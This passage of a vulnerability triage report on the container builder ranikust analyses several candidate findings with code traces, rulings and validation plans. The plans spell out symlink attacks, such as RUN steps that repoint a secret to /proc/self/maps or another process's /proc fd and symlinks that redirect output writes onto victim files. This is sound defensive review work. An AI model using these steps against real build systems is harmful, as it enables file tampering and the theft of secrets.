Dockerfile and build context: ranikust's own code that reads them treats them as hostile.

Section 8 exclusion: anything in section 6, or anything that needs the operator to pass a dangerous flag knowingly, is not a vulnerability. A context-relative output path is not plainly a knowingly dangerous flag, and section 6 has no entry for it.
Critical: untrusted input makes ranikust write or delete a host file outside its directories.
Every path from a build context is untrusted and is reached only through RootPath, never std::fs.
Security invariant: write only to the build root, the state directory or store, and the outputs. A followed link writes elsewhere.
The per-stage kaniko check (paths_outside_the_root) skips every path outside the stages directory. Overlay mode has no equivalent check (main.rs:353-363).
The book describes the digest files as local paths whose missing directory is made 0700. It gives no warning against placing outputs inside the context.

blockers: Policy ruling needed. threat-model.md:42 and rnk-builder lib.rs:23-24 trust operator output paths, and threat-model.md:205-207 excludes dangerous flags passed knowingly. threat-model.md:43 and rules.md:21-23 distrust context content. No ADR or section 6 entry says whether filesystem objects the context owner placed at an operator-typed output path inside the context are trusted. The code does not settle it either: a --dockerfile not found as given is read through the context root (build.rs:554-555), but one that exists as given, the default 'Dockerfile' run from the checkout included, is read on the host and follows a committed symlink (build.rs:561-566, 592).

Runtime unobserved. This run forbids target-controlled execution: there is no OS-enforced sandbox on the host, and cargo, the ranikust binary and Docker are off limits. So neither the T0 tests nor the overlay and per-stage builds below were run. Source and POSIX semantics (O_CREAT|O_TRUNC follows a symlink; protected_symlinks applies only in sticky directories) predict the result.

Deployment fact. Source cannot show whether supported deployments run ranikust as root in overlay or per-stage kaniko mode with an output path, or a parent of one, inside a context whose owner cannot edit the job's command line. Examples are pull-request builds driven by base-branch workflows, shared pipeline libraries, and build services for third-party repositories. Where the context owner also writes the job definition, no boundary is crossed.

validation_plan.local: (1) T0, unprivileged, tempdir only. Next to build.rs:2070, add a test that creates tempdir/victim with the content 'keep me', an empty tempdir/elsewhere/, and tempdir/ctx/ with ctx/digest -> ../victim, ctx/dangling -> ../created and ctx/out -> ../elsewhere. Call write_digest_files with --digest-file=ctx/digest, then with --digest-file=ctx/dangling, and with -d r.example/a:1 --image-name-with-digest-file=ctx/out/names. In crates/rnk-builder/tests/outputs/robust.rs, call rnk_builder::write_docker_tar(&image, &[], ctx/out/image.tar) and write_oci_layout(&image, ctx/out/layout). In rnk-metrics, report::write_file is pub(crate), so in report.rs's mod tests (report.rs:498) call write_file(ctx/out/m.json, b"{}"). If the finding holds: victim reads 'sha256:0123', tempdir/created exists, and elsewhere/ holds names, image.tar, layout/ (oci-layout, index.json, blobs/sha256/*) and m.json. After a fix: victim is unchanged, created is absent, elsewhere/ is empty, and every call is refused or stays inside ctx. Run: cargo test -p ranikust digest_files; cargo test -p rnk-builder --test outputs planted; cargo test -p rnk-metrics write_file. (2) T2c, 'sysadmin' profile (ADR-0063: throwaway rootful Docker container on the marked test machine, never --privileged, no host volume, --network none, tmpfs /work). As root in the container: mkdir -p /work/ctx /work/elsewhere; printf 'keep me' > /work/victim; printf 'FROM scratch\nCOPY a /a\n' > /work/ctx/Dockerfile; echo x > /work/ctx/a; ln -s /work/victim /work/ctx/digest.txt; ln -s /work/elsewhere /work/ctx/out. Then cd /work/ctx && ranikust --context=. --no-push --digest-file=digest.txt --tar-path=out/image.tar --oci-layout-path=out/layout --metrics-file=out/m.json --state-dir=/work/state. Confirm that the log's 'set up for' line names overlay mode. Then cat /work/victim (finding: sha256:<digest>) and ls -R /work/elsewhere (finding: image.tar, layout/, m.json). (3) T2 VM (just test-vm), because per-stage kaniko mode needs root outside a container. Use the same fixture under a mktemp -d directory on the VM, with --mode=kaniko and a fresh temporary --state-dir. Confirm that the log says kaniko mode builds in a directory of the state directory, then run the same checks. Use dummy victim files only; never point a link at a system file.
validation_plan.deployment: Owner-observed: list the CI jobs and build services that run ranikust as root in overlay mode or per-stage kaniko mode, on a host, a VM or a privileged container. For each, record whether any output flag or --metrics-file names a path under the directory passed as --context, including relative paths run from the checkout. Also record whether the people who can commit to that context can edit the job's command line. A finding exists only where outputs lie in the context and the context's committers cannot edit the job.

title: RUN stdout is relayed raw onto the stdout that also carries the printed image digest, so RUN output can put digest-shaped bytes before the digest line
description: The source trace is accurate. RunSpec::new defaults stdout to Stdio::Inherit (crates/rnk-sandbox/src/spec.rs:284), and the builder does not override it (crates/rnk-builder/src/stage.rs:768-784). Sandbox::run calls Relay::start for every RUN (crates/rnk-sandbox/src/spawner.rs:769), which copies the RUN's stdout pipe to ranikust's fd 1 (crates/rnk-sandbox/src/relay.rs:58) as raw bytes, with no framing (copy_once/write_all, relay.rs:187-248). The relay is joined after the RUN is reaped (spawner.rs:818). report_built then writes the digest with writeln! to the same stdout (crates/ranikust/src/main.rs:371) and does not start it on a fresh line. Logs go to stderr (crates/rnk-metrics/src/lib.rs:228). So a RUN can print whole digest-shaped lines before the real digest line, or leave an unterminated prefix on it. Nothing can follow or replace the digest line. A consumer that takes the last '^sha256:...$' match, or the first field of the last line, from stdout can therefore read a digest the RUN chose. The only such consumers in the repository are test scripts that build Dockerfiles the project controls (tests/smoke/lib.bash:72, tests/smoke/cases.bash:46, tests/vm/guest/push.sh:49-50). The forged value can only point a consumer at another digest that already exists in the operator's repository. The image ranikust builds and pushes, its tags and the --digest-file output are unchanged.
claimed_root_cause: One unframed stdout stream carries two things: lower-trust RUN stdout, relayed by Relay::start (crates/rnk-sandbox/src/relay.rs:58, targets [0,1,2]), and the digest that report_built prints (crates/ranikust/src/main.rs:371). There is no separator or fresh-line guard, and no option keeps RUN output off stdout.

trace.description: A Dockerfile RUN becomes a RunSpec. Lines 768-784 set isolation, script, env, user, workdir, network, mounts and secrets, and leave stdout and stderr at their defaults. The command is the Dockerfile author's, and it may run base-image or dependency binaries.
stdout: Stdio::Inherit (stderr likewise at line 285).
Relay::start runs on the job's stdio for every RUN, in Full and in Direct isolation.
start_into(stdio, keep, uid, gid, [0, 1, 2]) maps the RUN's stdout pipe (slot 1) to ranikust's fd 1.
Each read chunk is written verbatim to fd 1. There is no line framing or prefix, and a trailing newline is not tracked.
relay.finish() joins the relay after the RUN is reaped and swept, so all RUN bytes reach fd 1 before build::run returns.

writeln!(std::io::stdout(), "{}", built.digest) appends the digest to the same stream, continuing any partial line the last RUN output left. report_built is called on both success paths (main.rs:364, 455).

evidence.description: 'It prints the image digest on stdout.' It does not say that stdout holds only the digest.

--digest-file, --image-name-with-digest-file and --image-name-tag-with-digest-file (lines 83-85) are the documented channels for the digest. They also work with --no-push. They are written by write_digest_files (crates/ranikust/src/build.rs:734, called at :940) from image.digest(), which RUN output cannot shape.
report_built's doc comment calls the digest the build's result. Line 371 prints it to the same stdout the relay writes to.
The RUN's stdout and stderr are relayed to ranikust's fds 1 and 2. copy_once and write_all (lines 187-248) add no framing.

Accepted Streams decision: each RUN's stdout and stderr become pipes that are 'copied by one thread per RUN to ranikust's stream'. The code implements this. The ADR protects the operator's descriptors (truncation, O_NONBLOCK), not the content the RUN writes.

Trust table: 'Dockerfile and build context: The operator decides whether to build them (ADR-0003). RUN commands get the mode's isolation (§4).' RUN code is code the operator chose to run. The isolation protects the host, state, credentials and secrets, not what RUN emits or writes into the image.

A6, the integrity of the output image, is defined as 'shipping content the Dockerfile did not ask for'. A digest that the Dockerfile's own RUN prints is something the Dockerfile asked for, and the built image, its tags and the digest files stay correct.

Accepted risk: RUN shares the host network by default and can reach the cloud metadata service. Line 123: RUN may redirect ranikust's later requests. Both give RUN far more than steering a consumer's digest parse.

Only stages the targets need are kept (also crates/ranikust/src/cli.rs:538: 'unused stages are always skipped'). So every RUN that can write to stdout runs in a stage that feeds the target and can already shape the image or the artifacts it ships.

smoke_digest uses grep -Eo '^sha256:[0-9a-f]{64}$' | tail -1. tests/smoke/cases.bash:46 does the same, and tests/vm/guest/push.sh:49-50 uses tail -1 with a sha256:* check. These are the only stdout consumers in source, and all of them build Dockerfiles the project controls, so no lower-trust principal controls their RUN output.

reason: Rejected: the effect crosses no trust boundary. The trace and line numbers are correct. The bytes come from a RUN, that is, the Dockerfile author's command or binaries it chose to run. Under ADR-0003 and threat-model §3 (line 43), the operator decides whether to run that code. Unused stages are never built (graph.rs:191, cli.rs:538), so that code already controls the image, or the artifacts ranikust ships and pushes under the operator's tags. It also holds broader accepted powers (host network and metadata service, threat-model §6 lines 123 and 140). Forging digest-shaped lines on stdout only adds the ability to make a careless stdout parser name another digest that already exists in the operator's repository. That is self-impact on the RUN author's own build output, not access to an asset in §2. The image, its tags and the --digest-file channels (usage.md:83-85, build.rs:734) stay correct. The digest line itself can never be followed or replaced, and a strict tail -1 consumer fails closed on a merged line. Relaying RUN stdout to ranikust's stdout is the accepted ADR-0057 Streams design (line 89) and matches kaniko's baseline (RUN stdout to os.Stdout). The only parsers in source are test scripts that build project-controlled Dockerfiles. Hardening worth recording, not a vulnerability: state in usage.md that stdout also carries RUN output and point machine consumers to --digest-file. Optionally relay RUN stdout to stderr, as BuildKit does, or print the digest after a fresh-line guard.

title: A Direct RUN can repoint a file --secret so ranikust opens /proc/self (or, with extra container capabilities, other processes' /proc entries) and hands the bytes to a later RUN
description: In kaniko mode on a container's / (Isolation::Direct), a file secret (--secret id=s,src=PATH) is checked once at start-up but re-opened by path, with a plain symlink-following open in ranikust's own process, each time a later RUN mounts it with env=. paths_outside_the_root lets such a path stand only on an ignore-listed part of / (/ranikust, a volume, --ignore-path); /ranikust and writable volumes are writable by a root Direct RUN, which runs on the same / with Docker's default capabilities. A Dockerfile RUN can therefore replace the secret with a symlink of its choice; at the next RUN that mounts the secret, ranikust resolves it as itself: /proc/self is ranikust (the kernel's same-thread-group exception means PR_SET_DUMPABLE 0 does not apply to its own opens), and any capability the container grants beyond Docker's defaults stays in ranikust's sets (only the RUN child drops them: caps.rs:139, child.rs:163-167). Any regular, NUL-free result of at most 500 KiB becomes that RUN's environment variable. This defeats the ADR-0051/T21 premise that ranikust's /proc/self/fd/<n> names resolve only for ranikust's own code (rnk-store anon.rs:26-28) and that a RUN reads neither the store nor ranikust's descriptors 'even with SYS_PTRACE added to the container'. Impact predicted from source, to be observed: under Docker's default capabilities informational to low: ranikust's own /proc/self/maps (ASLR layout), status-type files, and NUL-free store entries reopened through /proc/self/fd/<n> (manifests and configs of images the Dockerfile itself names; gzip/zstd layers and kept-stage tars contain NUL bytes and are refused). /proc/self/environ (NUL separators, so DOCKER_AUTH_CONFIG and env-sourced secrets are refused) and /proc/self/mem (the read starts at address 0, below mmap_min_addr, so EIO) are not expected to leak. With capabilities beyond Docker's defaults plus CAP_SETPCAP (the supported Drop path, e.g. --cap-add SYS_PTRACE), ranikust's extra capabilities are exercised on RUN-chosen paths, reaching /proc/<pid>/{fd/<n>,root/...,cwd/...} of other processes in the PID namespace (a parent CI shell, shareProcessNamespace sidecars) that the trimmed RUN cannot open. Operators who follow the documented advice for this mode (secrets in the environment of ranikust started as PID 1) are not affected; the accepted risk at threat-model.md:119-122 covers a RUN reading a --secret src= file on /, not ranikust opening a RUN-chosen path. A peer unit owns ranikust's other by-path I/O after a Direct RUN; this sink (secret bytes into a RUN's environment) is separate. Likely fix: read each file secret once at start-up into memory (or keep the checked descriptor and pread from it), or reopen with openat2 RESOLVE_NO_SYMLINKS|RESOLVE_NO_MAGICLINKS and compare (dev, ino) with the start-up check.
claimed_root_cause: Secret::File keeps only an operator path, and Secret::read re-opens it at every RUN that mounts it (mounts.rs:50-53 -> open_secret mounts.rs:75-82) with rustix::fs::open, which follows symlinks and /proc magic links, without O_NOFOLLOW, openat2 RESOLVE_NO_SYMLINKS|RESOLVE_NO_MAGICLINKS, or a check that the inode is the one validated at start-up (build.rs:500-504). Under Isolation::Direct the path lies on the same / that every earlier RUN writes as uid 0, and the open runs in ranikust's process, with ranikust's /proc/self identity and its untrimmed capability sets rather than the RUN's.

trace.description: A Dockerfile RUN under Isolation::Direct execs as uid 0 on the container's own / with Docker's default capabilities and no mount namespace; its command replaces the operator's secret path with a symlink (e.g. rm -f /ranikust/sec/s && ln -s /proc/self/maps /ranikust/sec/s), or renames a non-mountpoint ancestor of it.
The operator's --secret id=ID,src=PATH (or a bare id naming a file, line 261) becomes Secret::File(absolute path): only the path is kept.

In kaniko mode on / a file secret must lie on an ignore-listed path (a volume, /ranikust, --ignore-path) or the build is refused, so it sits on the / that Direct RUNs share; /ranikust is a fixed ignore entry (crates/rnk-snapshot/src/kaniko/ignore.rs:171) and a RUN can write there (threat-model.md section 6).
Secret::check opens and validates the file once before any RUN; only the path-bearing Secret is inserted into the secrets map (line 504), with no bytes, descriptor or (dev, ino) kept.
For each later RUN, after the earlier RUN's process tree is gone, direct_mounts (line 714) keeps env= secrets and run_mounts runs in ranikust's own process with cx.secrets.
The read cache is local to run_mounts (line 149), so secret.read(&id) re-reads the file for this RUN.
rustix::fs::open(path, RDONLY|NONBLOCK|NOCTTY|CLOEXEC) follows the planted symlink and /proc magic links; /proc/self resolves to ranikust, and the open uses ranikust's full capability sets.

Only S_IFREG (procfs files, memfds and unlinked store files are regular) and st_size <= 500 KiB (procfs reports 0) are checked; Secret::read then reads up to 500 KiB + 1 (lines 57-59) and refuses only a larger result (line 64).
Data without a NUL byte is pushed as (env name, bytes) into RunMounts.env (lines 409-410); NUL-separated files such as /proc/self/environ are refused here.
env.append(&mut mounts.env); spec.env = env (line 780) becomes the next Direct RUN's envp at execve, where the Dockerfile's command reads it and can send it out over the host network.

evidence.description: open_secret uses a plain path open that follows symlinks and magic links; no O_NOFOLLOW, RESOLVE_NO_MAGICLINKS or (dev, ino) pin against the start-up check.
Secrets are read once per RUN (cache local to run_mounts), so every RUN after a Direct RUN re-opens the path.
After the start-up check only the path-bearing Secret is stored; the validated inode or descriptor is not kept.
direct_caps trims capabilities beyond Docker's defaults from the RUN child only (Drop when CAP_SETPCAP is present; applied in the child, child.rs:163-167); ranikust keeps them for its own opens.
PR_SET_DUMPABLE 0 protects /proc/<ranikust>/{fd,maps,environ,mem} from other processes, not from ranikust's own open of /proc/self/....
The anonymous store names its files to its own code as /proc/self/fd/<n>, 'which only ranikust's process resolves': a RUN-planted symlink makes ranikust's process resolve one for the RUN.
Stated consequence: a RUN in a default container reads neither the store nor ranikust's environment, descriptors or memory, even with SYS_PTRACE added (goal at line 17: 'by any route').

T21: a RUN reading ranikust's state or descriptors through /proc/<pid>/ is a threat the mode claims to close; the accepted risk at lines 119-122 covers a RUN reading a --secret src= file on /, not ranikust reading a RUN-chosen target for a later RUN.
The VM secrets suite passes no --secret, so no test repoints a file secret between RUNs; crates/rnk-builder/src/mounts/tests.rs has no symlink or swap case either.

blockers: Run-specific constraint: no target-controlled execution and no OS-enforced sandbox on this host, so no build was run; that ranikust's own open of a RUN-planted symlink to /proc/self/comm, /proc/self/maps or /proc/self/fd/<n> (a memfd or unlinked store file) succeeds, passes the S_IFREG and 500 KiB checks and reaches the next RUN's environment is predicted from kernel behaviour (same-thread-group exception in ptrace access checks; procfs files are S_IFREG with st_size 0) but unobserved.

Under Docker's default capabilities the source-predicted yield is informational (ranikust's memory map, status-type files, NUL-free JSON blobs of images the Dockerfile names); whether any descriptor ranikust holds at RUN set-up gives a RUN data it is not already entitled to is unobserved.

Whether a root Direct RUN can repoint a secret that lives on a read-only volume by renaming a non-mountpoint ancestor of the mount point (renaming the mount point itself is refused with EBUSY) is unobserved.

Impact beyond ranikust's own /proc/self depends on deployment: capabilities beyond Docker's defaults with CAP_SETPCAP (e.g. --cap-add SYS_PTRACE or SYSLOG), other processes in the PID namespace (ranikust not PID 1, shareProcessNamespace), and file secrets placed on RUN-writable ignore-listed paths rather than in the environment; this needs owner observation.

validation_plan.local: Tier T2 (just test-vm, disposable VM) or the T2c rootful-Docker lane with the ADR-0063 marker; dummy values only; no push. W is a fresh directory with ctx/ (Dockerfile) and out/ (mode 755). Common docker run options as in tests/vm/guest/secrets.sh: --rm -v $RNK:/ranikust/bin/ranikust:ro -v $W/ctx:/ranikust/ctx:ro -v $W/out:/ranikust/out -v /etc/ssl/certs:/etc/ssl/certs:ro -e DOCKER_AUTH_CONFIG=<dummy auth JSON holding dummy-auth-4242> ubuntu:24.04. Container command (exec keeps ranikust PID 1): sh -c 'mkdir -p /ranikust/sec && echo dummy-secret-4242 >/ranikust/sec/s && exec /ranikust/bin/ranikust --mode=kaniko --context /ranikust/ctx --no-push --oci-layout-path /ranikust/out/oci --secret id=s,src=/ranikust/sec/s'. (A) Default capabilities, Dockerfile: FROM ubuntu:24.04 / RUN --mount=type=secret,id=s,env=S sh -c 'echo "base:[$(printf %s "$S")]"' / RUN rm -f /ranikust/sec/s && ln -s /proc/self/comm /ranikust/sec/s / RUN --mount=type=secret,id=s,env=S sh -c 'echo "comm:[$(printf %s "$S")]"' / RUN cat /proc/1/maps >/dev/null 2>&1 && echo direct-maps-readable || echo direct-maps-blocked / RUN rm -f /ranikust/sec/s && ln -s /proc/self/maps /ranikust/sec/s / RUN --mount=type=secret,id=s,env=S sh -c 'printf %s "$S" | grep -c ranikust'. (The command substitution strips the trailing newline that comm and the echo-written files end with.) Vulnerable if the log shows base:[dummy-secret-4242], comm:[ranikust] (ranikust's comm, not sh), direct-maps-blocked and a nonzero count; not vulnerable if the RUN after a swap fails on open/regular-file or still shows dummy-secret-4242. (B) Store descriptors: one build with RUN ls /proc/1/fd records ranikust's descriptor numbers; then, per number n, a separate build with RUN cat /proc/1/fd/<n> >/dev/null 2>&1 && echo direct-fd-readable || echo direct-fd-blocked / RUN rm -f /ranikust/sec/s && ln -s /proc/self/fd/<n> /ranikust/sec/s / RUN --mount=type=secret,id=s,env=S sh -c 'printf %s "$S" | grep -c -e rootfs -e mediaType'. Vulnerable if any n gives direct-fd-blocked and a nonzero count (a store JSON blob); a refusal for sockets, pipes or directories is expected. (C) Same options plus --cap-add SYS_PTRACE and a holder: sh -c 'mkdir -p /ranikust/sec; echo dummy-secret-4242 >/ranikust/sec/s; echo dummy-held-4242 >/tmp/held; (exec 9</tmp/held; rm /tmp/held; exec sleep 600) & exec /ranikust/bin/ranikust <same flags>'; Dockerfile: FROM ubuntu:24.04 / RUN p=$(for d in /proc/[0-9]*; do [ "$(cat $d/comm 2>/dev/null)" = sleep ] && echo ${d#/proc/}; done); echo holder=$p; cat /proc/$p/fd/9 2>/dev/null || echo direct-blocked; rm -f /ranikust/sec/s; ln -s /proc/$p/fd/9 /ranikust/sec/s / RUN --mount=type=secret,id=s,env=S sh -c 'echo "held:[$(printf %s "$S")]"'. Vulnerable if direct-blocked is followed by held:[dummy-held-4242]. (D) Negative controls: separate builds that point the symlink at /proc/self/environ and /proc/self/mem must fail with the NUL refusal ('secret "s" contains a NUL byte') and a read error respectively, and grep -r dummy-auth-4242 over the logs and $W/out must find nothing. (E) Rename route: the kernel refuses to rename a mount point itself (vfs_rename returns EBUSY for a local mountpoint), so the volume sits one level below a non-mountpoint directory: add -v $W/ro:/ranikust/sec/ro:ro with $W/ro/s holding dummy-ro-4242 and use --secret id=s,src=/ranikust/sec/ro/s; Dockerfile: FROM ubuntu:24.04 / RUN --mount=type=secret,id=s,env=S sh -c 'echo "ro-base:[$(printf %s "$S")]"' / RUN mv /ranikust/sec /ranikust/sec.old && mkdir -p /ranikust/sec/ro && ln -s /proc/self/comm /ranikust/sec/ro/s / RUN --mount=type=secret,id=s,env=S sh -c 'echo "ro:[$(printf %s "$S")]"'. Vulnerable if ro-base:[dummy-ro-4242] is followed by ro:[ranikust]; not vulnerable if the mv fails or the last RUN fails on open/regular-file or still shows dummy-ro-4242. Control: a separate build whose RUN is mv /ranikust/sec/ro /ranikust/sec/ro.old must fail with 'Device or resource busy'. Regression after a fix (read each file secret once at start-up, or pread from the checked descriptor, or openat2 with RESOLVE_NO_SYMLINKS|RESOLVE_NO_MAGICLINKS plus a (dev, ino) match): a T0 test in crates/rnk-builder/src/mounts/tests.rs that checks a file secret, replaces it with a symlink to another regular file (and, separately, renames a new file over it), and asserts run_mounts returns the original bytes or refuses; plus a VM secrets-suite vector V11 with steps (A) and (C).
validation_plan.deployment: Owner observation, not probing: in the CI/Kubernetes deployments that run kaniko mode on /, check whether file secrets (--secret src= or a bare id naming a file) are used and where they live (/ranikust, a writable volume such as an emptyDir, an --ignore-path directory, or a read-only volume whose non-mountpoint ancestor is on the container root); whether ranikust runs as the container's PID 1; whether build containers are granted capabilities beyond Docker's defaults (securityContext.capabilities.add, docker --cap-add) and keep CAP_SETPCAP; and whether they share a PID namespace with other containers (shareProcessNamespace) or run alongside other long-lived processes.

title: --secret id-only fallback reads the file named by the id from the operator's cwd, following symlinks as root
description: When the operator passes --secret id=X, or type=env,id=X with no env= and no src=, and variable X is unset, config.rs makes the source Secret::File(<cwd>/X). open_secret opens it with plain open(2) at AT_FDCWD, which follows symlinks, and checks only S_IFREG and st_size <= 500 KiB (procfs files report size 0). The candidate argues that a context owner who commits X as a symlink to /proc/self/environ or to a root-only host file gets those bytes at /run/secrets/X inside an Isolation::Full RUN. The source path is as described, but the input that picks the file is the trusted operator's: the --secret flag and the working directory. Its documented and decided meaning is "the variable named ID if it is set, else the file ID" (Q-022, ADR-0032, usage.md:110). ranikust never makes the build context the secret's directory: the context defaults to /workspace/, not the cwd. When the variable is unset and no such file exists, set-up fails closed (build.rs:497-504). A context owner can only reach this name when the operator chooses to take secret material from a directory that the context owner writes. That choice already hands the secret's contents to the context owner, exactly like src=./X. Following symlinks on an operator-chosen secret path is intended and shared with BuildKit's client and kaniko. Kubernetes secret volumes are symlink chains, so the proposed RESOLVE_NO_SYMLINKS fix would break legitimate sources. Possible hardening, not a vulnerability: warn when the fallback picks a file, above all with type=env, and optionally refuse procfs or sysfs file secrets.
claimed_root_cause: The candidate's claim: the id-only and type=env fallback (config.rs:260-261) builds a cwd-relative secret path that the operator never typed, and open_secret (mounts.rs:75-97) opens it as root, following symlinks and magic links, with no filesystem, owner or location check. The size-0 procfs file or the small root-only file therefore reaches /run/secrets/<id>. Refuted: the path and the cwd are trusted operator configuration with documented semantics, not input from a lower-trust principal.

trace.description: The operator's --secret value. With type=env and no env=, src is moved into env (lines 729-730), so both stay None when no src= was given. This entrypoint is a trusted operator flag, not a lower-trust one.

With neither env nor src set, the source is Secret::Env(id) when the variable is set (line 260). Otherwise it is Secret::File(absolute(id)), made absolute against the operator's cwd without resolving symlinks (absolute, lines 639-642), as documented.

Secret::check opens every file secret once at start-up. A fallback name that does not exist fails the build here, so a working configuration either has the variable set or deliberately reads a file in the cwd.

rustix::fs::open at AT_FDCWD with RDONLY|NONBLOCK|NOCTTY|CLOEXEC follows symlinks. The checks at lines 84 and 90 are S_IFREG and st_size, so they catch FIFOs, devices and large files, not symlinks or procfs.
Each RUN calls run_mounts with the Dockerfile's mounts and the operator's secret map. The read runs in ranikust's own process.
The Dockerfile's id selects one of the operator's declared secrets. Secret::read reopens the path and reads at most 500 KiB + 1 bytes (lines 50-60). The NUL refusal applies only to env= (line 404).
The bytes become a SecretFile at /run/secrets/<id> (line 419), mode 0400, owned by root by default.

The child writes the bytes on the RUN's own tmpfs and bind-mounts them read-only at the target, so the RUN that asked for the secret can read them. That is the intended delivery of an operator-chosen secret.

evidence.description: The operator's flags are trusted. ranikust protects the operator from typing mistakes such as a wrong --state-dir, not from intent. The --secret source and the cwd are operator inputs.
User docs state the fallback: without src= or env=, "the variable named ID if it is set, else the file ID". The operator is told that an id-only secret may be read from a file of that name.
Q-022 was answered on 2026-10-30: with no source, the variable named by the id if set, else the file named by the id. It is recorded in ADR-0032 (table row at line 57) and kept by ADR-0049.

Crate boundary: every path, the secrets included, is a value from the caller, and command-line paths are trusted (line 23). Only paths inside an image root must go through rnk-rootfs. No boundary requires operator secret paths to be confined or free of symlinks.
--context defaults to /workspace/, not the cwd. ranikust never makes the build context the directory the fallback reads; only the operator's choice of cwd can.

With the variable unset and no file, start-up fails closed. Reaching a context-owned name therefore needs an operator configuration that takes the secret from a directory the context owner writes, which already gives that owner the secret's contents, as src=./X would.
When the variable is set, the source is the variable and no file is opened. The file route needs the operator's own environment to lack the variable, which the context owner cannot cause.

T11 limits where secret bytes may go: only to the RUN that asks, never to logs, layers or the RUN environment. It promises nothing about what an operator-chosen source path resolves to, and the delivery here goes only to the asking RUN.

Following symlinks on the operator's secret path is the intended semantics, the same as BuildKit's client store (store.go os.Stat/os.ReadFile) and kaniko. Kubernetes secret volumes are symlink chains (..data), so refusing symlinks would break legitimate src= and fallback sources.

reason: No lower-trust principal controls the input. The secret path comes from the trusted operator's --secret flag and cwd (threat-model.md:42, rnk-builder lib.rs:15-23), under the documented and decided Q-022/ADR-0032 rule "variable if set, else the file named by the id" (usage.md:110). ranikust never makes the build context the secret's directory (--context defaults to /workspace/), and a missing fallback file fails closed at start-up (build.rs:497-504). A context-owned symlink is reached only when the operator chooses to take secret material from a directory the context owner writes. That configuration already delegates the secret's contents to the context owner, exactly as src=./X would, so following a symlink there crosses no boundary the project promises. T11 and ADR-0051 govern where secret bytes go (only the asking RUN, which holds here), not what an operator path resolves to. No threat-model row, ADR or crate boundary requires operator secret paths to be symlink-free. Following symlinks is intended and is required for Kubernetes secret volumes. Residual is hardening only: warn when the fallback picks a file, especially with type=env, and optionally refuse procfs or sysfs sources.

title: ContextFiles::load re-inserts every ancestor of every context entry into a full-path BTreeMap, so per-entry CPU grows with the square of directory depth (bounded by PATH_MAX)
description: Source confirms the mechanism. prepare runs ContextFiles::load once per build, before any stage and whatever the Dockerfile copies (crates/ranikust/src/build.rs:435-436). For every entry the walk reports, load walks all of the entry's ancestors, copies each one with to_owned() and inserts it into BTreeMap<PathBuf, Kind> (crates/rnk-builder/src/sources.rs:70-74). Every such key is already present: the walk reports a directory when it visits it, or reports a held-back excluded parent outermost first before its first reported child (crates/rnk-context/src/walk.rs:264-276). The loop is therefore redundant, but each pass still allocates and copies the ancestor path and runs a B-tree search. std orders PathBuf component-wise, with a byte-wise shared-prefix fast path, so each comparison costs about the shared prefix length. An entry at depth D with one-byte names costs about D allocations, about D^2 bytes copied and about c x D^2 byte comparisons, where c is the number of key comparisons per search (an estimated 20 to 60 for 10^5 keys). Depth is bounded: the walk opens each directory by its full relative path through openat2 (walk.rs:167-169, rnk-rootfs/src/root.rs:271), so a directory path of PATH_MAX or more fails the build with ENAMETOOLONG. That caps D at about 2048 one-byte components. The cost is therefore not asymptotically quadratic in input size. It is linear in the entry count N with a per-entry constant about D x c times larger than the walk's own O(L) work: an estimated 1 to 50 ms per leaf at D of about 2000, depending on whether the prefix loop vectorizes and on musl malloc. A chain of 2048 directories alone costs about c x D^3 / 3 byte steps, an estimated several seconds. With N = 100,000 leaves (a single git tree of a few MB), the estimate is minutes to over an hour of single-threaded CPU before the first stage. The walk keeps a full PathBuf per entry, and the set keeps one more (walk.rs:201, sources.rs:85), about 8 KB per entry at this depth. That linear memory bounds N in practice, so whether the CPU effect matters depends on the unmeasured per-entry constant. ContextFiles::follow (sources.rs:193-219) shows the same pattern, one full-path join and lookup per component and up to MAX_HOPS = 40 restarts. Reaching it also needs a Dockerfile source that resolves through many deep context symlinks. Impact limits: the cost falls only on the building process's own thread. During prepare a named store holds only the per-build lock (crates/rnk-store/src/store.rs:255-259), so other builds are not blocked. Nothing persists after the build is killed. When the Dockerfile lives in the context, the same principal can already burn unbounded CPU with RUN, which T15 leaves to the outer cgroup, so the effect adds a capability only when the context owner is not the Dockerfile author. That happens with an operator-supplied Dockerfile read from a host path (build.rs:561-567) whose steps do not run context-controlled code. The threat model still requires ranikust's own context-reading code to treat the context as hostile (threat-model.md:43). It names deep trees and very many files under T15 (line 92) and rates denial of service from untrusted input with default settings as Medium (line 202). Section 6 accepts no risk for context size or depth.
claimed_root_cause: ContextFiles::load (crates/rnk-builder/src/sources.rs:70-74) runs an unconditional ancestor loop for every walked entry. It materializes each ancestor PathBuf with to_owned() and inserts it into a BTreeMap keyed by full relative paths, where each comparison costs about the shared prefix length. The walk already guarantees that every ancestor was reported before its descendants (crates/rnk-context/src/walk.rs:264-276), so the loop never adds a key. Its cost per entry is about c x D^2 byte steps instead of O(L). The only bound is PATH_MAX on directory paths (D at most about 2048), and the context has no entry-count or time budget.

trace.description: The operator-named build context directory, whose contents the lower-trust context owner controls, is opened as a Context rooted at a RootPath (ContextSpec::Dir is the only context kind implemented).
ContextFiles::load runs once for every build, before any stage and regardless of what the Dockerfile copies, with no entry-count, depth or time budget beyond the walk's own failure.

Each directory is opened by its full relative path (RootPath::open_at, then openat2 at rnk-rootfs/src/root.rs:271), so only a directory path of PATH_MAX or more fails, with ENAMETOOLONG. Depth is capped at about 2048 one-byte components. Each child is statx'd relative to the fd and carries its full path (line 201).

Before any entry inside them, held-back parent directories are reported outermost first. Non-excluded directories are reported when visited (line 276). Every ancestor of a reported entry has therefore already been yielded to load.
